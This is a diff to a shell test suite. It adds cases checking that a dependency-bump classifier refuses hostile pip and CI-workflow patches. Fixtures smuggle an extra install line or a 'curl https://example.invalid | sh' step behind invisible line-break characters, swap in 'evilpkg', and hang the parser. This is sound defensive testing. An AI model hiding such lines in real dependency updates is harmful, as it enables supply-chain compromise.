@@ -3819,6 +3819,84 @@ grep -q '"verdict": "dependency-bump"' <<<"$vout" \
     && ok "a marker with a dash inside a quoted value is still a pin" \
     || bad "a marker with a dash inside a value was refused: $(tr -d '\n' <<<"$vout" | cut -c1-160)"
 
+# A review of the first version found nineteen diffs it called bumps. Each case
+# below is one of them, cut down.
+pip_hostile() {  # $1 = name, $2 = reason text, rest = patch body lines (printf %b escapes allowed)
+    local name="$1" why="$2"; shift 2
+    printf '%b\n' "$@" > "$dp/pip-h-$name.patch"
+    vout="$(timeout 20 python3 "$cdb" < "$dp/pip-h-$name.patch" 2>&1)"
+    grep -q '"verdict": "refused"' <<<"$vout" && grep -q -- "$why" <<<"$vout" \
+        && ok "a pip diff that $name is refused" \
+        || bad "a pip diff that $name passed or refused for another reason: $(tr -d '\n' <<<"$vout" | cut -c1-160)"
+}
+rq_head=('diff --git a/requirements.txt b/requirements.txt' '--- a/requirements.txt' '+++ b/requirements.txt')
+# git ends a diff line at \n only. Python's splitlines also breaks at \f, \v,
+# \x1c-\x1e, \x85, \u2028 and a lone \r, and so does pip, so a fragment after
+# one of them was a line pip installs and the classifier never saw. YAML breaks
+# at \x85 and \u2028 too, so the workflow arm had the same blind spot.
+for ch in '\x0c' '\x0b' '\x1c' '\r' '\xc2\x85' '\xe2\x80\xa8'; do
+    pip_hostile_name="hides a line behind ${ch}"
+    pip_hostile "$pip_hostile_name" 'line break' "${rq_head[@]}" '@@ -1,2 +1,2 @@' \
+        '-PyYAML==6.0.2 \\' "-    --hash=sha256:$h0" \
+        '+PyYAML==6.0.3 \\' "+    --hash=sha256:$h1${ch} -e git+https://example.invalid/x.git#egg=x"
+done
+cat > "$dp/wf-hidden.patch" <<PATCH
+diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
+--- a/.github/workflows/ci.yml
++++ b/.github/workflows/ci.yml
+@@ -299,1 +299,1 @@ jobs:
+-        uses: taiki-e/install-action@fa23953489c080190314742a9b907f8e97c6767c  # v2.87.10
++        uses: taiki-e/install-action@76c2e6406e52637deed7160d77bded76bd83e06e  # v2.87.14$(printf '\xe2\x80\xa8')      - run: curl https://example.invalid | sh
+PATCH
+vout="$(dep_case "$dp/wf-hidden.patch")"
+grep -q '"verdict": "refused"' <<<"$vout" && grep -q 'line break' <<<"$vout" \
+    && ok "a workflow pin line hiding a step behind U+2028 is refused" \
+    || bad "a workflow line with a hidden step passed: $(tr -d '\n' <<<"$vout" | cut -c1-160)"
+# Inside a hunk, a removed line that reads `-- x` prints as `--- x`, and the
+# parser skipped it as a file header. Hunk lines are counted now.
+pip_hostile "removes a line the parser took for a header" 'not a pinned requirement' "${rq_head[@]}" '@@ -1,3 +1,2 @@' \
+    '-PyYAML==6.0.2 \\' "-    --hash=sha256:$h0" '--- --index-url https://pypi.internal.invalid/simple' \
+    '+PyYAML==6.0.3 \\' "+    --hash=sha256:$h1"
+# A bump moves a version. Anything else that keeps the grammar is still not one.
+pip_hostile "swaps one package for another" 'adds or removes a package' "${rq_head[@]}" '@@ -1,2 +1,2 @@' \
+    '-PyYAML==6.0.2 \\' "-    --hash=sha256:$h0" '+evilpkg==1.0 \\' "+    --hash=sha256:$h1"
+pip_hostile "removes a package" 'adds or removes a package' "${rq_head[@]}" '@@ -1,2 +0,0 @@' \
+    '-PyYAML==6.0.2 \\' "-    --hash=sha256:$h0"
+pip_hostile "changes only a marker" 'marker' "${rq_head[@]}" '@@ -1,2 +1,2 @@' \
+    '-PyYAML==6.0.3 ; sys_platform == "win32" \\' "-    --hash=sha256:$h0" \
+    '+PyYAML==6.0.3 ; sys_platform == "linux" \\' "+    --hash=sha256:$h0"
+pip_hostile "downgrades" 'lower version' "${rq_head[@]}" '@@ -1,2 +1,2 @@' \
+    '-PyYAML==6.0.3 \\' "-    --hash=sha256:$h0" '+PyYAML==5.3 \\' "+    --hash=sha256:$h1"
+pip_hostile "deletes the file" 'deletes' 'diff --git a/requirements.txt b/requirements.txt' 'deleted file mode 100644' \
+    '--- a/requirements.txt' '+++ /dev/null' '@@ -1,2 +0,0 @@' '-PyYAML==6.0.2 \\' "-    --hash=sha256:$h0"
+pip_hostile "renames another file into place" 'rename' 'diff --git a/scripts/ci-runner.sh b/requirements.txt' \
+    'similarity index 100%' 'rename from scripts/ci-runner.sh' 'rename to requirements.txt'
+pip_hostile "changes the pin and none of its hashes" 'no hash' "${rq_head[@]}" '@@ -1,2 +1,2 @@' \
+    '-PyYAML==6.0.2 \\' '+PyYAML==6.0.3 \\' "     --hash=sha256:$h0"
+pip_hostile "puts a space after the continuation backslash" 'not a pinned requirement' "${rq_head[@]}" '@@ -1,2 +1,2 @@' \
+    '-PyYAML==6.0.2 \\' "-    --hash=sha256:$h0" '+PyYAML==6.0.3 \\ ' "+    --hash=sha256:$h1"
+# Context lines never reach the arm, so without a hunk boundary a hash added
+# under another package's unchanged pin was credited to the last added one.
+pip_hostile "credits a hash from another hunk" 'without the requirement' "${rq_head[@]}" '@@ -1,1 +1,2 @@' \
+    '-PyYAML==6.0.2 \\' '+PyYAML==6.0.3 \\' "+    --hash=sha256:$h1 \\\\" \
+    '@@ -50,2 +50,3 @@' ' bar==2.0 \\' "+    --hash=sha256:$h0 \\\\" "     --hash=sha256:${h1//0/1}"
+pip_hostile "is not UTF-8" 'not UTF-8' "${rq_head[@]}" '@@ -1,2 +1,2 @@' \
+    '-PyYAML==6.0.2 \\' "-    --hash=sha256:$h0" '+PyYAML==6.0.3 \\' "+    --hash=sha256:$h1\\xff"
+pip_hostile "only changes a file mode" 'changes no line' 'diff --git a/requirements.txt b/requirements.txt' \
+    'old mode 100644' 'new mode 100755'
+pip_hostile "adds the same package twice" 'twice' "${rq_head[@]}" '@@ -1,2 +1,4 @@' \
+    '-PyYAML==6.0.2 \\' "-    --hash=sha256:$h0" '+PyYAML==6.0.3 \\' "+    --hash=sha256:$h1" \
+    '+pyyaml==6.0.3 \\' "+    --hash=sha256:$h0"
+# A marker's lazy quantifier used to backtrack cubically: 1500 spaces took
+# longer than 30 s. The case has to finish inside the 20 s cap above.
+long_spaces="$(printf '%*s' 1500 '')"
+pip_hostile "hangs the parser with a long marker" 'not a pinned requirement' "${rq_head[@]}" '@@ -1,1 +1,1 @@' \
+    '-a==1' "+a==2 ;${long_spaces}@"
+# The parser is linear now, and the line cap stays as a bound of its own: a
+# well-formed marker padded past it is refused before it is read.
+pip_hostile "pads a marker past the line cap" 'not a pinned requirement' "${rq_head[@]}" '@@ -1,1 +1,1 @@' \
+    '-a==1' "+a==2 ; python_version${long_spaces}>= \"3\""
+
 # And the gate has to spend that classification: a dependency receipt is one an
 # unattended run may merge on, because the gate observed the checks itself.
 grep -q 'verify-deps' "$root/bin/maintainer-merge" \
@@ -4076,6 +4154,7 @@ vpr_case "a release PyPI does not have is could-not-ask" 1 'could not ask' PyYAM
 vpr_case "a name that is not a plain package name never reaches the URL" 1 'not a plain' '../PyYAML' 6.0.3 "$h1"
 vpr_case "a version that is not a plain version never reaches the URL" 1 'not a plain' PyYAML '6.0.3/../../x' "$h1"
 vpr_case "a hash that is not 64 hex is refused" 1 'not a sha256' PyYAML 6.0.3 'abc'
+vpr_case "a release with no files and no hashes to check is refused" 1 'no files' Empty 1.0 ''
 
 # And the fail-open the loops used to have. `while ... done < <(python3 ...)`
 # reports the redirection's status, so a producer that died left the loop with
@@ -4115,6 +4194,17 @@ if [ "$drc" != 0 ] && grep -q 'declared 1 pip package' <<<"$dout" \
     ok "a pip package the gate skipped refuses the receipt, rather than counting zero"
 else
     bad "a pip package the gate skipped refuses the receipt, and this one did not (rc=$drc)"
+fi
+# A classifier that never answers must not stall an unattended run or pass.
+cat > "$fake_scripts/classify_dependency_bump.py" <<'STUB'
+import time
+time.sleep(30)
+STUB
+dout="$(MAINTAINER_CLASSIFY_TIMEOUT=2 dep_gate "$dp/pip.patch" unused)"; drc=$?
+if [ "$drc" != 0 ] && grep -q 'ran past 2s' <<<"$dout" && [ ! -f "$dep_state/receipts/9.json" ]; then
+    ok "a classifier that runs out of time refuses the receipt"
+else
+    bad "a classifier that runs out of time did not refuse by name (rc=$drc): $(tr -d '\n' <<<"$dout" | cut -c1-140)"
 fi
 unset DEP_SCRIPTS
 rm -f "$stub_dir/gh"
@@ -8362,8 +8452,14 @@ drift_bites readme-counts 'out of order' "a gap in the lesson numbering is caugh
 # The lesson count is a floor of ten, so ONE new entry must leave every document
 # current (that is the point: no per-pull-request edit), and entries that carry
 # the count over a multiple of ten must make every stated figure stale.
-drift_fresh; printf '\n## %s. a lesson the floor absorbs\n' \
-    "$(( $(grep -c '^## [0-9]*\. ' "$dr/docs/lessons.md") + 1 ))" >> "$dr/docs/lessons.md"
+drift_fresh; n="$(grep -c '^## [0-9]*\. ' "$dr/docs/lessons.md")"
+if [ $(( (n + 1) % 10 )) = 0 ]; then
+    # From 119 the next entry crosses a multiple of ten, which is the other case
+    # below; this one failed the day the repository reached 119. Drop the last
+    # entry first, so the one appended keeps the count where it is.
+    sed -i "/^## $n\. /,\$d" "$dr/docs/lessons.md"; n=$((n - 1))
+fi
+printf '\n## %s. a lesson the floor absorbs\n' "$((n + 1))" >> "$dr/docs/lessons.md"
 out="$(python3 "$chk" --root "$dr" --only readme-counts 2>&1)"; rc=$?
 [ "$(drift_sum)" != "$drift_pristine" ] && [ "$rc" = 0 ] \
     && ok "one new lesson entry changes no stated figure, because lessons are shown as a floor" \
